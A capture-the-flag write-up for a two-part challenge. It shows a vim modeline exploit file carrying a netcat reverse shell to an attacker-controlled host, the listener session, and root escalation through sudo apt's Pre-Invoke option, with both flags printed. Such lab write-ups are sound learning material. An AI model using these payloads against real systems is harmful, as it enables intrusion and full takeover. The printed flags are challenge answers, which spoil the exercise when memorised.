# Obituary 1+2
## Description:
```
Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you're ready.

You're using vim, right? You should use it; it'll change your life. I basically depend on it for everything these days!

NOTE: This challenge is two parts. Flag one belongs to mwazoski. Flag two belongs to root.
```

This means, that this guy has a service listening and opens everything passed to the service with `vim`. After searching for remote code execution vulnerabilities for `vim` I found this one: https://www.exploit-db.com/exploits/46973. All I had to do was to write a file triggering the exploit and pass it over to the service. But first, let's find the service using `nmap`.

## Port scan:
```
# nmap 172.30.0.2
...
Nmap scan report for 172.30.0.2
Host is up (0.18s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
4321/tcp open  rwhois
...
```

## Exploit: 
```
# cat reverse_shell.txt
:!nc -nv 172.30.0.14 4444 -e /bin/sh||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```

## Setup listener and trigger exploit:
```
# nc 172.30.0.2 4321 < reverse_shell.txt

# nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.30.0.14] from (UNKNOWN) [172.30.0.2] 37646
id
uid=1000(mwazowski) gid=1000(mwazowski) groups=1000(mwazowski)
cd /home/mwazowski
cat flag.txt
gigem{ca7_1s7_t0_mak3_suRe}
```

## Privilege Escalation:
```
mwazowski@94458050976a:~$ cat note_to_self.txt 
Apparently my packages are out of date. ITSEC is really throwing a fit about me
needing to update since red team popped my box.

I'm sending them my installed packages. I have no idea how these guys got root
on my machine, my password is like 60 characters long. The only thing I have
as nopasswd is apt, which I just use for updates anyway.

mwazowski@94458050976a:~$ sudo -l
Matching Defaults entries for mwazowski on 94458050976a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mwazowski may run the following commands on 94458050976a:
    (root) NOPASSWD: /usr/bin/apt
```

Great! We can run `/usr/bin/apt` as root without providing any password! Checking https://gtfobins.github.io/gtfobins/apt/ reveals, that you can escalate privileges with the following:

```
mwazowski@94458050976a:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

# cat flag.txt
gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}
```
